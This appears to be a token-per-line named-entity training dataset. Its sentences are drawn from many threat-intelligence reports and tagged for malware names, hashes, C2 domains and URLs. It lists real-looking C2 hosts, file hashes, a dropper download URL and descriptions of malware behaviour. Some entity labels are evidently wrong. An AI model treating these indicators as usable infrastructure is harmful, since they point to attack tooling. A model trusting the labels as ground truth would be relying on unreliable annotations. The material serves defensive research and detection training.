However	O
,	O
an	O
alternate	O
explanation	O
may	O
point	O
to	O
a	O
Chinese	O
exploit	O
supplier	O
or	O
the	O
language	O
competency	O
of	O
the	O
developer	O
.	O

are	O
three	O
random	O
characters	O
)	O
.	O

This	O
observation	O
may	O
reveal	O
that	O
the	O
Moafee	B-malware.infosteal
group	O
is	O
physically	O
located	O
in	O
this	O
province	O
.	O

XtremeRAT	B-malware.backdoor

Some	O
of	O
the	O
filenames	O
used	O
in	O
the	O
attacks	O
included	O
:	O
FT	O
-	O
Ukraine	O
Russia	O
's	O
new	O
art	O
of	O
war.doc	O
Катастрофа	O
малайзийского	O
лайнера	O
Diplomatic	O
Car	O
for	O
Sale.doc	O
МВКСИ	O
Organigrama	O
Gobierno	O
Rusia.doc	O
Фото	O
Информационное	O
письмо	O
Форма	O
заявки	O
(	O
25-26.09.14	O
)	O
.doc	O
Информационное	O
письмо	O
Письмо	O
_	O
Руководителям	O
Прилож	O
Car	O
for	O
sale.doc	O
Af-Pak	O
and	O
Central	O
Asia	O
's	O
security	O
issues.doc	O
At	O
least	O
one	O
of	O
them	O
immediately	O
reminded	O
us	O
of	O
RedOctober	B-malware.unknown
,	O
which	O
used	O
a	O
very	O
similarly	O
named	O
spearphish	O
:	O
'	O
Diplomatic	O
Car	O
for	O
Sale.doc	O
'	O
.	O

Value	O
:	O
ServiceDLL	O

struct	O
PCCFilePacketHeader	O
DWORD	O
dwTotalPayloadSize	O
;	O
DWORD	O
dwCommandType	O
;	O

861C90536B3B5A4A8309ADBBFD5C4713	B-hash
natco3.no-ip.net	B-url.cncsvr
US	O

When	O
executed	O
in	O
a	O
sandbox	O
,	O
we	O
observed	O
it	O
connecting	O
to	O
a	O
command	O
&	O
control	O
(	O
C	O
&	O
C	O
)	O
server	O
at	O
newrat2.no-ip.org	B-url.cncsvr
on	O
TCP	O
port	O
1604	O
.	O

i=Me3tMZEHAuvkc~uJsO~W7lX1vSsgkuW99vD3FRgi	O

Instead	O
,	O
both	O
the	O
remote	O
controller	O
and	O
the	O
backdoor	O
connect	O
to	O
its	O
main	O
communication	O
control	O
server	O
to	O
push	O
or	O
pull	O
pieces	O
of	O
information	O
.	O

The	O
CozyDuke	B-malware.drop
toolset	O
also	O
includes	O
multiple	O
kinds	O
of	O
droppers	O
for	O
infecting	O
hosts	O
with	O
CozyDuke	B-malware.drop
or	O
for	O
executing	O
additional	O
tools	O
from	O
the	O
CozyDuke	B-malware.drop
toolset	O
.	O

All	O
of	O
these	O
operations	O
have	O
aimed	O
to	O
achieve	O
a	O
similar	O
objective	O
:	O
securing	O
a	O
political	O
outcome	O
beneficial	O
to	O
Russia	O
.	O

Initial	O
GET	O
request	O
The	O
malware	O
communicates	O
with	O
a	O
remote	O
command	O
and	O
control	O
(	O
CnC	O
)	O
server	O
.	O

Their	O
tools	O
and	O
techniques	O
are	O
well	O
above	O
the	O
average	O
.	O

The	O
functions	O
generally	O
accept	O
binary	O
data	O
from	O
the	O
user	O
,	O
and	O
handle	O
the	O
code	O
'	O
signing	O
'	O
and	O
check	O
sums	O
prior	O
to	O
passing	O
the	O
data	O
to	O
lower	O
level	O
libraries	O
for	O
serialization	O
on	O
to	O
the	O
network	O
.	O

The	O
IV	O
consists	O
of	O
4	O
additional	O
readings	O
.	O

The	O
relationship	O
between	O
the	O
two	O
attack	O
groups	O
may	O
be	O
direct	O
or	O
indirect	O
,	O
but	O
based	O
on	O
our	O
current	O
visibility	O
,	O
they	O
seem	O
to	O
have	O
two	O
distinct	O
missions	O
,	O
with	O
each	O
one	O
targeting	O
different	O
industries	O
.	O

Figure	O
3	O
:	O
Generic	O
network	O
retrieval	O
and	O
decrypt	O
routine	O
Data	O
transmission	O
is	O
initiated	O
by	O
the	O
client	O
,	O
whereby	O
the	O
client	O
HTTP	O
POSTs	O
a	O
randomly	O
generated	O
RSA	O
modulus	O
n	O
and	O
the	O
exponent	O
0x10001	O
,	O
and	O
the	O
server	O
responds	O
with	O
the	O
following	O
structure	O
:	O
Figure	O
4	O
:	O
Structure	O
of	O
encrypted	O
data	O
To	O
decrypt	O
the	O
data	O
payload	O
,	O
the	O
client	O
decrypts	O
the	O
encrypted	O
AES	O
key	O
using	O
its	O
randomly	O
generated	O
private	O
key	O
,	O
then	O
decrypts	O
the	O
data	O
payload	O
with	O
the	O
decrypted	O
AES	O
key	O
.	O

Figure	O
11	O
:	O
Network	O
Traffic	O
for	O
Host	O
Enumeration	O

The	O
choices	O
are	O
interesting	O
though	O
,	O
many	O
correspond	O
to	O
what	O
looks	O
like	O
the	O
birth	O
year	O
of	O
the	O
controller	O
(	O
ie	O
.	O

This	O
report	O
describes	O
the	O
features	O
that	O
make	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
an	O
increasingly	O
popular	O
tool	O
for	O
cyber	O
attackers	O
.	O

1	O
.	O

d9821468315ccd3b9ea03161566ef18e	B-hash
b9308a65383681b862e16e4c042dbf7a61cce716	B-hash
0x55ECEE49	O
[	O
Mon	O
Sep	O
07	O
01:54:17	O
2015	O
UTC	O
]	O
Microsoft	O
Visual	O
C++	O
v6.0	O
DLL	O

Raw	O
attacker	O
traffic	O
:	O

Exploit	O
Document	O
MD5	O
:	O

They	O
first	O
contain	O
the	O
same	O
malicious	O
code	O
.	O

The	O
C2	O
domain	O
is	O
de-obfuscated	O
using	O
the	O
same	O
code	O
observed	O
in	O
the	O
analysis	O
of	O
the	O
'	O
75D3D1F23628122A64A2F1B7EF33F5CF	O
'	O
(	O
malicious	O
DLL	O
payload	O
dropped	O
into	O
the	O
system	O
)	O
,	O
but	O
in	O
this	O
case	O
the	O
XOR	O
keys	O
used	O
are	O
different	O
from	O
the	O
sample	O
previously	O
analyzed	O
.	O

4bd060270da3b9666f5886cf4eeaef3164fad438	B-hash

This	O
report	O
is	O
based	O
on	O
information	O
extracted	O
from	O
reverse	O
engineering	O
and	O
analysis	O
of	O
two	O
PE	O
files	O
.	O

Comparing	O
Dark	O
Seoul	O
with	O
previous	O
attacks	O
shows	O
that	O
it	O
was	O
technically	O
low	O
in	O
sophistication	O
while	O
causing	O
high	O
impact	O
to	O
the	O
organizations	O
affected	O
.	O

Attack	O
Option	O
2	O
:	O
Reprogram	O
the	O
SIS	O
to	O
allow	O
an	O
unsafe	O
state	O

Attackers	O
are	O
banking	O
on	O
network	O
vulnerabilities	O
and	O
inherent	O
weaknesses	O
to	O
facilitate	O
massive	O
malware	O
attacks	O
,	O

AM	O
,	O
AZ	O
,	O
FR	O
,	O
DE	O
,	O
IQ	O
,	O
IT	O
,	O
KG	O
,	O
MA	O
,	O
CH	O
,	O
UA	O
,	O
US	O
,	O
VN	O
DealersChoice	B-malware.backdoor
emails	I-malware.backdoor
,	O
like	O
the	O
one	O
above	O
,	O
that	O
we	O
were	O
able	O
to	O
recover	O
from	O
third	O
party	O
sources	O
provided	O
additional	O
targeting	O
insight	O
,	O
and	O
confirmed	O
some	O
of	O
the	O
targeting	O
within	O
our	O
KSN	O
data	O
:	O
TR	O
,	O
PL	O
,	O
BA	O
,	O
AZ	O
,	O
KR	O
,	O
LV	O
,	O
GE	O
,	O
LV	O
,	O
AU	O
,	O
SE	O
,	O
BE	O
Sofacy	O
kicked	O
off	O
the	O
year	O
deploying	O
two	O
0day	B-malware.unknown
in	O
a	O
spearphish	O
document	O
,	O
both	O
a	O
Microsoft	O
Office	O
encapsulated	O
postscript	O
type	O
confusion	O
exploit	O
(	O
abusing	O
CVE-2017-0262	O
)	O
and	O
an	O
escalation	O
of	O
privilege	O
use-after-free	O
exploit	O
(	O
abusing	O
CVE-2017-0263	O
)	O
.	O

勒索病毒分析	O

Apache	O
server	O
log	O
from	O
December	O
29	O
,	O
2017	O
.	O

A	O
server	O
identified	O
in	O
Germany	O
has	O
the	O
registrant	O
'	O
Gamma	O
International	O
GmbH	O
,	O
'	O
and	O
the	O
contact	O
person	O
is	O
listed	O
as	O
'	O
Martin	O
Muench	O
.	O
'	O

37	O
.	O

In	O
August	O
2014	O
,	O
some	O
of	O
our	O
users	O
observed	O
targeted	O
attacks	O
with	O
a	O
variation	O
of	O
CVE-2012-0158	B-malware.unknown
and	O
an	O
unusual	O
set	O
of	O
malware	O
.	O

We	O
suspect	O
that	O
the	O
use	O
of	O
malware	O
by	O
governments	O
to	O
spy	O
on	O
political	O
dissidents	O
,	O
especially	O
exiles	O
who	O
live	O
outside	O
of	O
their	O
government	O
's	O
direct	O
sphere	O
of	O
influence	O
is	O
increasingly	O
common	O
,	O
which	O
presents	O
many	O
opportunities	O
for	O
further	O
research	O
.	O

!	O
150316o==	O

Download	O
backdoor	O
:	O
Downloads	O
dropper	O
file	O
http://www.hisunpharm.com/	B-url.unknown
pao.exe	B-malware.drop
files/File/product/	O
and	O
stores	O
it	O
to	O
C	O
:	O
\Program	B-malware.backdoor
Files\tongji2.exe	I-malware.backdoor
from	O

Also	O
the	O
C2	O
domain	O
update.iaacstudio[.]com	B-url.unknown
was	O
previously	O
used	O
in	O
their	O
campaigns	O
.	O

Mutexes	O

IoCs	O
Samples	B-hash
Network	B-ip.unknown

Full	O
File	O
Path	O
SHA256	O
File	O
Size	O
Compile	O
Time	O

All	O
rights	O
reserved	O
.	O

s2.send	O
(	O
encode	O
(	O
'	O
login_OK	O
'	O
)	O
+	O
'	O
\x00	O
'	O
)	O
52	O
.	O

MainCommsLoop_sub_493A30	O
(	O
)	O
,	O
and	O
focus	O
our	O
attention	O
on	O
the	O
aforementioned	O
loop	O
:	O

NO	O
WARRANTY	O
.	O

Mutter	B-malware.backdoor
is	O
HTTP	O
proxy	O
aware	O
,	O
and	O
attempts	O
to	O
determine	O
if	O
a	O
proxy	O
is	O
required	O
and	O
what	O
the	O
proxy	O
details	O
are	O
if	O
necessary	O
.	O

This	O
campaign	O
suggests	O
the	O
attackers	O
may	O
plan	O
a	O
future	O
heist	O
against	O
these	O
targets	O
by	O
using	O
Bankshot	O
to	O
gather	O
information	O
.	O

Additionally	O
,	O
submodule	O
Y	O
==	O
1	O
records	O
Skype	O
chat	O
messages	O
,	O
and	O
submodule	O
Y	O
==	O
2	O
records	O
audio	O
from	O
all	O
participants	O
in	O
a	O
Skype	O
call	O
.	O

Figure	O
9	O
shows	O
the	O
time	O
stamps	O
of	O
the	O
three	O
files	O
in	O
the	O
test	O
directory	O
before	O
the	O
Web	B-malware.ransom
shell	O
modifies	O
the	O
time	O
stamps	O
.	O

17	O

All	O
the	O
exploits	O
and	O
malicious	O
payload	O
were	O
uploaded	O
through	O
remote	O
servers	O
.	O

These	O
tools	O
include	O
the	O
EternalBlue	O
exploit	O
(	O
which	O
was	O
previously	O
used	O
by	O
WannaCry	B-malware.ransom
and	O
Petya	B-malware.ransom
)	O
.	O

The	O
email	O
purported	O
to	O
have	O
been	O
sent	O
from	O
legitimate	O
email	O
ids	O
.	O

MISCREANT	O
'S	O
IMPLANT	O
...................................................................................	O
6	O
3.1	O
ANTI-ANALYSIS	O
MEASURES	O
........................................................................	O
6	O
3.2	O
BABAR	B-malware.drop
CAME	O
TO	O
STAY	O
................................................................................	O
7	O
3.3	O
CONFIGURATION	O
DATA	O
..............................................................................	O
7	O
3.4	O
MODUS	O
OPERANDI	O
ELEPHANTI	O
.................................................................	O
9	O
3.5	O
FUNCTIONALITY	O
.......................................................................................	O
10	O
3.5.1	O
THE	O
KEYLOGGER	O
MODULE	O
................................................................	O
10	O
3.5.2	O
INVADING	O
DESKTOP	O
PROCESSES	O
.......................................................	O
11	O
3.5.3	O
I	O
AM	O
ROOT	O
(	O
kit	O
)	O
..................................................................................	O
11	O
3.6	O
STOLEN	O
GOODS	O
........................................................................................	O
13	O
3.7	O
CALLING	O
HOME	O
........................................................................................	O
14	O
4	O
.	O

This	O
table	O
only	O
includes	O
related	O
new	O
single	O
value	O
IoCs	O
which	O
were	O
not	O
already	O
published	O
in	O
our	O
previous	O
blog	O
,	O
which	O
we	O
are	O
happy	O
to	O
share	O
at	O
TLP	O
:	O
WHITE	O

Latest	O
Ransomware	O
Posts	O

P.O	O
Box	O
11976	O
,	O
Jubail	O
-	O
31961	O
.	O

The	O
smaller	O
plugins	O
deployed	O
in	O
2018	O
now	O
maintain	O
the	O
same	O
dynamic	O
encryption	O
code	O
as	O
the	O
large	O
330kb	O
full	O
SPLM	B-malware.backdoor
backdoors	O
seen	O
in	O
more	O
widespread	O
use	O
in	O
2017	O
.	O

Directories	O
with	O
names	O
greater	O
than	O
five	O
,	O
but	O
fewer	O
than	O
ten	O
characters	O
are	O
inspected	O
for	O
the	O
subdirectories	O
drop	O
,	O
files	O
,	O
logs	O
,	O
memory	O
,	O
and	O
shots	O
.	O

We	O
expect	O
to	O
provide	O
additional	O
data	O
,	O
and	O
some	O
of	O
this	O
information	O
may	O
change	O
as	O
a	O
result	O
of	O
continued	O
research	O
.	O

Lastly	O
,	O
the	O
macro	O
will	O
delete	O
any	O
evidence	O
of	O
the	O
emails	O
received	O
or	O
sent	O
by	O
the	O
attackers	O
.	O

It	O
also	O
checks	O
for	O
a	O
virtual	O
machine	O
environment	O
.	O

Launcher	O
randomInteger	O
:	O
max	O
:	O
]	O

Figure	O
1	O
describes	O
the	O
chain	O
of	O
events	O
after	O
a	O
victim	O
opens	O
the	O
malicious	O
shortcut	O
file	O
until	O
the	O
host	O
gets	O
infected	O
with	O
Asruex	B-malware.drop
.	O

Poseidon	B-malware.infosteal
's	O
conventional	O
means	O
of	O
deceiving	O
users	O
with	O
executable	O
files	O
posing	O
inside	O
Word	O
and	O
RTF	O
document	O
files	O
,	O
and	O
actual	O
poisoned	O
documents	O
with	O
malicious	O
macro­scripts	O
has	O
been	O
the	O
sole	O
method	O
used	O
for	O
compromising	O
their	O
desired	O
targets	O
.	O

Research	O
continues	O
to	O
uncover	O
troubling	O
cases	O
of	O
FinSpy	B-malware.backdoor
in	O
countries	O
with	O
dismal	O
human	O
rights	O
track	O
records	O
,	O
and	O
politically	O
repressive	O
regimes	O
.	O

The	O
first	O
contains	O
the	O
same	O
4	O
bytes	O
repeated	O
,	O
whereas	O
in	O
the	O
second	O
key	O
,	O
the	O
difference	O
between	O
all	O
consecutive	O
4-byte	O
blocks	O
(	O
with	O
byte	O
order	O
swapped	O
)	O
is	O
0x2625A	O
.	O

Figure	O
10	O
:	O

apple-iclods[.]net	B-url.cncsvr
apple-iclods.org	B-url.cncsvr
The	O
main	O
module	O
of	O
the	O
XAgent	B-malware.backdoor
component	O
is	O
called	O
BootXLoader	B-malware.backdoor
.	O

Home	O
FireEye	O
Blogs	O
Threat	O
Research	O
Metamorfo	B-malware.drop
Campaigns	O
Targeting	O
Brazilian	O
Users	O
Metamorfo	B-malware.drop
Campaigns	O
Targeting	O
Brazilian	O
Users	O

63f2ed5d2ee50e90cda809f2ac740244	B-hash
.	O

During	O
our	O
research	O
for	O
this	O
post	O
,	O
we	O
also	O
became	O
aware	O
of	O
multiple	O
public	O
reports	O
related	O
to	O
the	O
compromise	O
of	O
the	O
DPHK	O
website	O
on	O
both	O
Twitter	O
and	O
via	O
ThreatConnect	O
.	O

/from-blackenergy-to-expetr/78937/	B-url.normal
By	O
GReAT	O
Much	O
has	O
been	O
written	O
about	O
the	O
recent	O
ExPetr/NotPetya/Nyetya/Petya	O
outbreak	O
–	O
you	O
can	O
read	O
our	O
findings	O
here	O
:	O
Schroedinger	O
's	O
Pet	O
(	O
ya	O
)	O
and	O
ExPetr	O
is	O
a	O
wiper	O
,	O
not	O
ransomware	O
.	O

In	O
the	O
source	O
code	O
,	O
these	O
codes	O
are	O
contained	O
in	O
a	O
large	O
enum	O
in	O
a	O
header	O
fi	O
le	O
.	O

This	O
is	O
a	O
method	O
attackers	O
can	O
use	O
to	O
confuse	O
virus	O
detection	O
engines	O
looking	O
for	O
malicious	O
code	O
as	O
an	O
effort	O
to	O
detect	O
or	O
disinfect	O
the	O
data	O
in	O
memory	O
.	O

Most	O
of	O
the	O
time	O
,	O
connecting	O
the	O
dots	O
and	O
drawing	O
relationships	O
between	O
samples	O
and	O
campaigns	O
take	O
months	O
and	O
many	O
experts	O
.	O

This	O
seems	O
to	O
be	O
another	O
means	O
of	O
wasting	O
time	O
.	O

The	O
attacker	O
can	O
limit	O
access	O
to	O
specific	O
IP	O
addresses	O
,	O
either	O
through	O
whitelisting	O
networks	O
of	O
target	O
companies	O
or	O
individuals	O
via	O
a	O
regional	O
ISP	O
,	O
or	O
blacklisting	O
cloud	O
infrastructure	O
and	O
security	O
companies	O
.	O

7/12	O

Derived	O
on	O
the	O
class	O
,	O
the	O
class	O
performs	O
very	O
little	O
network	O
tunneling	O
within	O
interactive	O
PCC_PROXY	O
:	O
:ProcessPacket	O
and	O

This	O
way	O
Babar	B-malware.drop
leaves	O
a	O
visible	O
process	O
on	O
the	O
process	O
list	O
during	O
execution	O
.	O

NALYSIS	O
ON	O
THE	O
MAJOR	O
SAMPLE	O
(	O
S	O
AMPLE	O
B	O
)	O
OF	O
APT-TOCS	B-malware.infosteal
...........................................................................................	O
3	O

This	O
is	O
another	O
important	O
reminder	O
that	O
users	O
must	O
think	O
twice	O
before	O
clicking	O
on	O
unsolicited	O
links	O
or	O
requests	O
and	O
also	O
that	O
users	O
should	O
verify	O
credentials	O
from	O
any	O
unsolicited	O
calls	O
requesting	O
they	O
take	O
action	O
on	O
devices	O
.	O

Its	O
main	O
purpose	O
is	O
to	O
steal	O
sensitive	O
data	O
and	O
conduct	O
cyber-espionage	O
.	O

Judging	O
by	O
the	O
small	O
number	O
of	O
downloads	O
,	O
we	O
presume	O
that	O
this	O
payload	O
is	O
currently	O
undergoing	O
testing	O
.	O

Threat	O
actor	O

DUBNIUM	B-malware.drop
spawns	O
the	O
mshta.exe	O
process	O
with	O
the	O
URL	O
to	O
download	O
and	O
waits	O
for	O
some	O
time	O
,	O
after	O
that	O
it	O
opens	O
the	O

The	O
malicious	O
document	O
launches	O
a	O
PowerShell	O
script	O
when	O
the	O
user	O
clicks	O
'	O
Enable	O
Content	O
.	O
'	O

Below	O
screen	O
shot	O
shows	O
the	O
macro	O
content	O
extracted	O
by	O
the	O
oletools	O
.	O

The	O
command-and-control	O
server	O
has	O
not	O
responded	O
with	O
a	O
payload	O
for	O
the	O
third-stage	O
even	O
when	O
phoning	O
home	O
from	O
the	O
assumed	O
targeted	O
region	O
,	O
which	O
may	O
signal	O
that	O
the	O
campaign	O
has	O
been	O
ended	O
.	O

00005A58	O
Connection	O
:	O
close	O
00005A6C	O
Cache-Control	O
:	O
max-age=259200	O
00005A8C	O
Pragma	O
:	O
no-cache	O
00005AA0	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
6.0;Windows	O
NT	O
5.1	O
)	O
00005AD4	O
Content-Type	O
:	O
application/	O
octet-stream	O
00005AFC	O
image/gif	O
,	O
image/x-xbitmap	O
,	O
image/jpeg	O
,	O
image/	O
pjpeg	O
,	O
/	O
00005B38	O
Accept-Language	O
:	O
en-en	O
00005B50	O
%	O
s%02x	O
00005B5C	O
home.asp	O
00005B68	O
index.css	O
00005B74	O
index.jsp	O
00005B80	O
index.php	O
00005B8C	O
index.asp	O
00005EFC	O
ct.datangcun.com	O
00005F3C	O
ct.datangcun.com	O
00005F7C	O
20120509	O
00005F8C	O
CT	O
V2.1	O
00006374	O
Plugin_End	O
00006380	O
Plugin_Start	O
00006390	O
Plugin_Init	O
0000639C	O
Plugin_GetID	O

2017년	O
12월	O
,	O
안다리엘	O
그룹은	O
A사의	O
ERP	O
솔루션	O
업데이트	O
파일을	O
변조해	O
악성	O
코드가	O
다운로드되도록	O
했다	O
.	O

It	O
certainly	O
looks	O
like	O
an	O
initial	O
'	O
phone	O
home	O
'	O
exchange	O
of	O
information	O
,	O
after	O
which	O
the	O
bot	O
and	O
C	O
&	O
C	O
send	O
periodic	O
'	O
Keep	O
Alive	O
'	O
messages	O
to	O
each	O
other	O
.	O

Headquarters	O
(	O
netsat.exe	O
)	O
Functionality	O
–	O
Log	O
File	O

Other	O
attacks	O
have	O
been	O
reported	O
to	O
use	O
similar	O
security	O
software	O
lures	O
,	O
such	O
as	O
Juniper	O
Networks	O
and	O
Microsoft	O
Exchange	O
.	O

Both	O
malicious	O
programs	O
share	O
the	O
code	O
for	O
LZMA	O
compression	O
algorithm	O
.	O

Exposure	O
has	O
n't	O
deterred	O
the	O
group	O
.	O

This	O
command	O
also	O
depends	O
on	O
the	O
text	O
contained	O
in	O
the	O
unlabeled	O
textbox1	O
.	O

page	O
#	O
of	O
26	O

Depending	O
on	O
the	O
results	O
,	O
it	O
writes	O
a	O
line	O
to	O
its	O
log	O
file	O
.	O

Morgan	O
Marquis-Boire	O
Joan	O
Calvet	O
Paul	O
Rascagnéres	O
Alex	O
Dulaunoy	O
Raphael	O
Vinot	O
CIRCL	O
Luxembourg	O
page	O
|	O
2	O

The	O
second	O
branch	O
performs	O
a	O
similar	O
operation	O
:	O
it	O
first	O
tests	O
to	O
make	O
sure	O
that	O
the	O
value	O
of	O
the	O
source	O
byte	O
is	O
not	O
0x47	O
or	O
greater	O
(	O
in	O
which	O
case	O
it	O
will	O
immediately	O
bail	O
out	O
of	O
the	O
loop	O
and	O
jump	O
to	O
the	O
end	O
of	O
the	O
PreProcess_sub_44C1C0	O
(	O
)	O

In	O
typical	O
attacks	O
of	O
this	O
nature	O
,	O
once	O
users	O
navigate	O
to	O
the	O
link	O
,	O
visitors	O
are	O
prompted	O
to	O
supply	O
account	O
credentials	O
and	O
personal	O
information	O
under	O
the	O
false	O
assumption	O
that	O
they	O
are	O
communicating	O
with	O
their	O
bank	O
via	O
a	O
secure	O
link	O
.	O

This	O
technique	O
compared	O
the	O
mouse/cursor	O
pointer	O
's	O
screen	O
position	O
coordinates	O
at	O
two	O
different	O
points	O
in	O
time	O
(	O
5000	O
milliseconds	O
)	O
.	O

Customer	O
Stories	O
Blogs	O
Home	O
FireEye	O
Blogs	O
Threat	O
Research	O
Blog	O
tion	O
Beeb	B-malware.infosteal
us	I-malware.infosteal

Therefore	O
,	O
the	O
implant	O
likely	O
targeted	O
military	O
artillery	O
units	O
operating	O
against	O
pro-Russian	O
separatists	O
in	O
Eastern	O
Ukraine	O
.	O

In	O
the	O
configuration	O
file	O
we	O
found	O
thirteen	O
keys	O
for	O
thirteen	O
different	O
modules	O
.	O

NALYSIS	O
ON	O
MODULE	O
......................................................................................................................................	O
4	O

Investigating	O
the	O
domain	O
idsadesk[.]in	B-url.unknown
(	O
which	O
was	O
used	O
to	O
send	O
the	O
email	O
by	O
impersonating	O
the	O
identity	O
of	O
IDSA	O
)	O
shows	O
that	O
it	O
was	O
created	O
on	O
20th	O
Feb	O
2017	O
(	O
which	O
is	O
the	O
day	O
before	O
the	O
spear-phishing	O
email	O
was	O
sent	O
to	O
the	O
victims	O
)	O
.	O

(	O
https://www.facebook[.]com/montaser.ali.338	B-url.unknown
)	O
.	O

Description	O

We	O
suspect	O
this	O
change	O
was	O
a	O
direct	O
result	O
of	O
the	O
Arbor	O
blog	O
post	O
in	O
order	O
to	O
decrease	O
detection	O
of	O
RIPTIDE	B-malware.backdoor
by	O
security	O
vendors	O
.	O

Oil	O
and	O
gas	O
sector	O
enterprise	O

Please	O
see	O
attached	O
the	O
TT	O
Copy	O
of	O
the	O
USD25,000	O
as	O
directed	O
by	O
our	O
sales	O
Manager	O
.	O

So	O
the	O
len	O
function	O
will	O
be	O
executed	O
and	O
the	O
value	O
of	O
the	O
specified	O
memory	O
address	O
will	O
be	O
returned	O
.	O

In	O
one	O
of	O
these	O
cases	O
we	O
and	O
other	O
researchers	O
were	O
able	O
to	O
observe	O
infrastructure	O
in	O
North	O
Korea	O
controlling	O
the	O
malware	O
–	O
further	O
clues	O
as	O
to	O
the	O
origins	O
of	O
these	O
attackers	O
.	O

The	O
dates	O
also	O
roughly	O
coincide	O
with	O
the	O
apparent	O
shift	O
in	O
IP	O
ranges	O
(	O
Appendix	B-url.cncsvr
B	O
)	O
,	O
from	O
first	O
being	O
located	O
in	O
Gaza	O
,	O
to	O
being	O
located	O
internationally	O
.	O

U.S.	O
DEFENSE	O
REGIONAL	O
CONFLICTS	O

The	O
sample	O
iterates	O
through	O
the	O
running	O
processes	O
,	O
kills	O
the	O
following	O
,	O
and	O
prevents	O
them	O
from	O
launching	O
:	O
msconfig.exe	O
TASKMGR.exe	O
regedit.exe	O
ccleaner64.exe	O
taskmgr.exe	O
itauaplicativo.exe	O
Next	O
,	O
it	O
uses	O
GetForegroundWindow	O
to	O
get	O
a	O
handle	O
to	O
the	O
window	O
the	O
user	O
is	O
viewing	O
and	O
GetWindowText	O
to	O
extract	O
the	O
title	O
of	O
the	O
window	O
.	O

Should	O
either	O
of	O
these	O
checks	O
fail	O
,	O
the	O
dropper	O
will	O
likewise	O
exit	O
immediately	O
.	O

What	O
's	O
more	O
,	O
according	O
to	O
an	O
appeal	O
filed	O
in	O
a	O
Swiss	O
court	O
on	O
behalf	O
of	O
the	O
Ablyazov	O
family	O
,	O
several	O
of	O
the	O
malware	O
samples	O
sent	O
to	O
Mr	O
.	O

In	O
addition	O
to	O
that	O
,	O
the	O
attackers	O
implemented	O
a	O
third	O
method	O
of	O
spreading	O
using	O
a	O
WMI	O
mechanism	O
.	O

Some	O
of	O
this	O
material	O
addresses	O
well-defined	O
vulnerabilities	O
.	O

'	O
Seoul	O
blames	O
Pyongyang	O
for	O
cyber	O
attacks	O
,	O
'	O
The	O
Korea	O
Herald	O
,	O
[	O
online	O
]	O
10	O
April	O
2013	O
,	O
Available	O
:	O
http://www.koreaherald.com/view.php?ud=20130410000766	B-url.normal
(	O
Accessed	O
:	O
18	O
April	O
2013	O
)	O
J.	O
Horejsi	O
.	O

Ultimately	O
,	O
we	O
could	O
make	O
no	O
sense	O
from	O
this	O
information	O
.	O

By	O
combining	O
multiple	O
layers	O
of	O
obfuscation	O
,	O
they	O
deter	O
the	O
process	O
of	O
reverse	O
engineering	O
and	O
also	O
attempt	O
to	O
evade	O
security	O
products	O
.	O

Following	O
the	O
release	O
of	O
the	O
article	O
,	O
FireEye	O
observed	O
a	O
distinct	O
change	O
in	O
RIPTIDE	O
's	O
protocols	O
and	O
strings	O
.	O

The	O
true	O
threat	O
is	O
the	O
human	O
being	O
who	O
is	O
operating	O
the	O
malware	O
.	O

Some	O
clues	O
also	O
suggest	O
that	O
computers	O
belonging	O
to	O
'	O
The	O
supporters	O
of	O
Korean	O
Unification	O
'	O

One	O
is	O
the	O
malicious	O
banking	O
Trojan	O
as	O
the	O
DLL	O
.	O

HKCU\SOFTWARE\Classes\AppXc52346ec40fb4061ad96be0e6cb7d16a\	O
HKCU\SOFTWARE\Classes\AppX3bbba44c6cae4d9695755183472171e2\	O
HKCU\SOFTWARE\Classes\CLSID	O
{	O
E3517E26-8E93-458D-A6DF-8030BC80528B	O
}	O
\	O
HKCU\SOFTWARE\Intel\Display\igfxcui\igfxtray\	O
;	O
[	O
NUMBER	O
]	O
;	O
[	O
DWORD	O
]	O
(	O
set	O
by	O
command	O
#	O
19	O
)	O

Different	O
colors	O
show	O
the	O
three	O
dropped	O
modules	O
:	O
legit	O
app	O
(	O
blue	O
)	O
,	O
launcher	O
(	O
green	O
)	O
,	O
and	O
decompressor	O
with	O
the	O
Trojan	O
embedded	O
(	O
red	O
)	O
launcher	O
(	O
green	O
)	O
,	O
and	O
decompressor	O
with	O
the	O
Trojan	O
embedded	O
(	O
red	O
)	O

The	O
client	O
sends	O
small	O
requests	O
-	O
packets	O
containing	O
commands	O
-	O
and	O
the	O
server	O
responds	O
to	O
those	O
commands	O
with	O
the	O
requested	O
data	O
.	O

The	O
first	O
clue	O
that	O
led	O
us	O
to	O
this	O
conclusion	O
are	O
the	O
attackers	O
'	O
working	O
hours	O
.	O

The	O
person	O
who	O
last	O
saved	O
the	O
documents	O
(	O
after	O
weaponizing	O
them	O
with	O
the	O
malicious	O
macro	O
)	O
forgot	O
to	O
clear	O
the	O
file	O
metadata	O
.	O

157XoNeU16jXldeq	O
157XoNeU16jXlA==	O
157Xlicn15zXmA==	O
157XldeT16LXmdef	O
157XldeT15nXoteZ158=	O
157Xldeh15Mg	O

When	O
Dino	B-malware.backdoor
restarts	O
,	O
the	O
module	O
is	O
deserialized	O
from	O
the	O
file	O
and	O
loaded	O
into	O
memory	O
.	O

However	O
,	O
in	O
2017	O
the	O
group	O
used	O
an	O
executable	O
wrapped	O
in	O
Delphi	O
,	O
whereas	O
the	O
sample	O
we	O
found	O
uses	O
a	O
self-extracting	O
archive	O
.	O

It	O
also	O
downloads	O
the	O
following	O
:	O

The	O
dynamic	O
DNS	O
domains	O
windowsupdate.no-ip[.]biz	O
and	O
masalavideos.no-ip[.]biz	O
were	O
also	O
being	O
mapped	O
to	O
IP	O
Address	O
199.91.173.43	B-ip.unknown
as	O
of	O
late	O
May	O
2013	O
,	O
when	O
the	O
video	O
themed	O
malicious	O
attachments	O
were	O
being	O
operationalized	O
.	O

There	O
were	O
indirect	O
overlaps	O
(	O
same	O
IP	O
,	O
at	O
different	O
times	O
)	O
with	O
110	O
of	O
the	O
Operation	O
Hangover	O
domains	O
and	O
all	O
but	O
two	O
of	O
the	O
domains	O
associated	O
with	O
Operation	B-malware.ransom
Manul	I-malware.ransom
.	O

5/10	O
Sample	O
#	O
4	O
(	O
msmpeng.exe	O
)	O
is	O
packed	O
with	O
Themida	O
to	O
hamper	O
analysis	O
under	O
a	O
debugger	O
,	O
a	O
monitoring	O
application	O
,	O
or	O
a	O
virtual	O
machine	O
.	O

Be	O
sure	O
to	O
check	O
out	O
their	O
analysis	O
.	O

These	O
include	O
sending	O
spear-phishing	O
emails	O
that	O
either	O
deliver	O
exploit	O
documents	O
that	O
deploy	O
malware	O
onto	O
a	O
user	O
's	O
systems	O
,	O
